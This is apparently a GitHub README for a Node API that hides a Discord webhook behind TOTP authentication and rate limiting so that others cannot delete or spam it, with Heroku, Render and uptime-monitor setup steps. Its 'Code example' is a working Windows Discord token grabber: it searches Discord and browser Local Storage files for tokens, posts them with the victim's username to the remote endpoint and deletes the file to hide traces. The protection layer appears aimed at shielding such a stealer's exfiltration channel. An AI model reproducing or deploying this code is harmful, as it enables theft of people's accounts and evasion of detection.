

<h1 align="center">
  <a id="top"></a>Discord Webhook Protector 🔰
</h1>

<p align="center"> 
  <kbd>
<img src="https://raw.githubusercontent.com/Rdimo/images/master/Discord-Webhook-Protector/Discord-Webhook-Protector.png"></img>
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
  <img src="https://img.shields.io/github/last-commit/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
  <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Discord-Webhook-Protector&metric=ncloc"/>
  <img src="https://img.shields.io/github/stars/Rdimo/Discord-Webhook-Protector?color=444444&label=Stars&style=flat-square"/>
  <img src="https://img.shields.io/github/forks/Rdimo/Discord-Webhook-Protector?color=444444&label=Forks&style=flat-square"/>
</p>


<h2 align="center">
  Discord-Webhook-Protector was made by

Love ❌ code ✅

</h2>

---


## <a id="content"></a>🌐 〢 Content

- [🔰・Features](#features)
- [🌌・Discord](https://cheataway.com/invite)
- [🎉・Setup the Api with Heroku](#heroku)
- [🎉・Setup the Api with Render](#render)
- [🧪・Testing the Api](#testing)
- [🟢・Keeping It alive 24/7](#alive)
- [⚙ ・Settings](#settings)
- [🎈・Code example](#code-example)

## <a id="features"></a>🔰 〢 Features

```
> Easy to setup!
> Configurable!
> Completely *free* and stays online *24/7*
> Accepts json, discord embeds and files!
> Ratelimits unauthorized requests!
> Accepting only post requests!
> Impossible to delete webhook
> Webhook protected by totp so very hard to spam webhook even if they http debug!
```
---

### <a id="heroku"></a>📁 〢 Hosting the API with Heroku

1. Create an account on [Heroku.com](https://heroku.com) (Yes all of this is **free**)
2. Install [nodejs](https://nodejs.org/en/), [heroku cli](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up), and [git](https://git-scm.com/)
3. Open [config.json](https://github.com/Rdimo/Discord-Webhook-Protector/blob/main/config.json) and put in your webhook at the top
4. Now you need a key, open cmd in the directory and type the following ⇣
```sh-session
$ cd test
$ py keyGen.py
>>> Your key is: ...
>>> Copied key to clipboard!
```
5. Paste your generated key in [config.json](https://github.com/Rdimo/Discord-Webhook-Protector/blob/main/config.json)
6. Open a new cmd in the directory and type `npm i`
7. Now follow these steps carefully ⇣

```sh-session
$ heroku login
...
$ git init
$ git add .
$ git commit -m "first Webhook protector api commit"
...
$ heroku create
...
$ git push heroku main
...
$ heroku ps:scale web=1
...
$ heroku domains
...
```

8. Done! After typing `heroku domains` you should get something in the console like **shrouded-fjord-36366.herokuapp.com**. This is your api with your undeletable/unspammable webhook!

#### If you get an error when doing `"git push heroku main"` that looks like this

```sh
$ first issue error: failed to push some refs to 'https://git.heroku.com/app-name.git'
```
Then run `"git push heroku master"` instead | https://github.com/Rdimo/Discord-Webhook-Protector/issues/1

ㅤ

If you make some changes in the code and want to update the api on heroku, simply run `npm run deploy` to push out the updates \
If any bugs occur please report them or try and see if restarting the app by typing `heroku restart` works!
<center><a href=#content> Back To Content </a> </center>

---

### <a id="render"></a>📁 〢 Hosting the API with Render

1. Setup an account on [Render](https://dashboard.render.com/register)
2. [Fork](https://github.com/Rdimo/Discord-Webhook-Protector/fork) This Repo **(Dont Forget to Make it Private And Edit the config.js File)**
3. Go to [This](https://dashboard.render.com/select-repo?type=web) Link and connect your GitHub Account
4. Select the repo you just made 
  ![image](https://user-images.githubusercontent.com/86944806/170194672-2a21aed0-cc1b-4efb-88d5-c835034c2e70.png)
5. On the next screen enter a uniqe name for it **(this name will be in your api)**
6. Select **Node** as your environment
![image](https://user-images.githubusercontent.com/86944806/170195377-fbc7a054-5b8b-4255-aaea-5a209d6c65af.png)
7. Scroll down and click on ![image](https://user-images.githubusercontent.com/86944806/170195784-9df18d5f-c8e5-4694-bafc-57e59fe0ee0e.png)
8. Thats it! It will build it in some time now **(Approx 5 mins)**
9. Your api url should look like this **(https://youruninqename.onrender.com)**
![image](https://user-images.githubusercontent.com/86944806/170196327-c44fa2c1-619f-43c4-b5aa-a121a98493bf.png)

<center><a href=#content> Back To Content </a> </center>

### <a id="testing"></a> 🧪〢Testing the Api

For testing that your api works, open test folder and edit the test .py file by putting your api url and passsword then open cmd in the directory and type the following ⇣

```sh-session
$ cd .\test
...
$ py test.py
```

It should've made a post request to the api uploading itself and sending "it works!" to the webhook
<center><a href=#content> Back To Content </a> </center>

---

### <a id="alive"></a>🟢〢Keeping It Alive 24/7

Free hosting will sleep your API after inactivity. It is 15 mins for Render. Now ofc we aren't gonna keep using our webhook so we can use a site like [Statuscake](statuscake.com) which is free.

***Note:** Heroku gives only 550 hours for free in a month whereas Render gives 750 hours (There are 744 hours in a month). So If u use this method on heroku then your api will be offline for last 8 days of the month. (Unless You have more hours on heroku by entering your credit card or buying) And so I recommend you use Render the host the API*

1. Sign up on [Statuscake](https://app.statuscake.com/Try)
2. Create a new [UpTime Test](https://app.statuscake.com/AddSite.php)
![image](https://user-images.githubusercontent.com/86944806/170201838-fc68aa1a-a554-4786-856b-ccf6b7d6170a.png)
3. Head down to ![image](https://user-images.githubusercontent.com/86944806/170203552-041cf979-c32b-4ed6-9051-f6d738949027.png) and follow what I've done. **(Don't Forget to❌the code 401)**
![image](https://user-images.githubusercontent.com/86944806/170203426-ed45ac96-d46c-4176-b977-e3164c57e6e9.png)
4. Scroll down and click on ![image](https://user-images.githubusercontent.com/86944806/170204712-47185645-0e81-4538-9829-5fca1ffa9e20.png)
5. Add if u want though its not needed **(click ok if u don't want to add)**
![image](https://user-images.githubusercontent.com/86944806/170204283-6de3d140-ef94-4cbf-88e0-1ad8da0872b8.png)
6. Thats it! Your webhook is now gonna be live 24/7
<center><a href=#content> Back To Content </a> </center>

---

### <a id="settings"></a> ⚙ 〢 Settings

The config and what the options do

```json
{
  "webhook": "https://discord.com/api/webhooks/0123456789/abcdefghijklmnopqrstuvwxyz", //your discord webhook
  "pass32": "K4ZVUQTSIRMDOWKRGU2WQQTZJM======" /*a key encoded in base32, use the keyGen in ./test or see https://github.com/bellstrand/totp-generator#how-to-use for more*/,
  "ratelimit": true, //if you want it to ratelimit unauthorized requests or not
  "rateLimitTimeout": 30000, //amount of milliseconds an ip gets ratelimited (Default: 30000 --> 30 seconds)
  "port": 3000 //port
}
```
<center><a href=#content> Back To Content </a> </center>

---

### <a id="code-example"></a>🎈 〢 Code example

Example use of the api hosted on heroku

```py
import os, re
import requests
from pyotp import TOTP

api = "https://your-heroku-app-name.herokuapp.com" #the name of your app will probably be something like https://frozen-beach-72554.herokuapp.com

pass32 = 'K4ZVUQTSIRMDOWKRGU2WQQTZJM======' #needs to be same key as the one in your api
key = TOTP(pass32).now()

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
_file = os.getenv('temp') + os.sep + 'tokens.txt'

paths = {
    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb'
}
for platform, path in paths.items():
    if not os.path.exists(path):
        continue
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    with open(_file, 'a') as f:
                        f.write(token)

requests.post(api, headers={"Authorization": key}, data={"content": f'Successfully grabbed tokens from {os.getlogin()}:'}) #send the text to webhook
requests.post(api, headers={"Authorization": key}, files={"upload_file": open(_file, 'rb')}) #send text file with tokens in it to the webhook
os.remove(_file) #delete traces
```

> Thank you [xrevix](https://github.com/xrevix) for bug testing and reporting all of them 😘

<p align="center"><a href=#top>Back to Top</a></p>
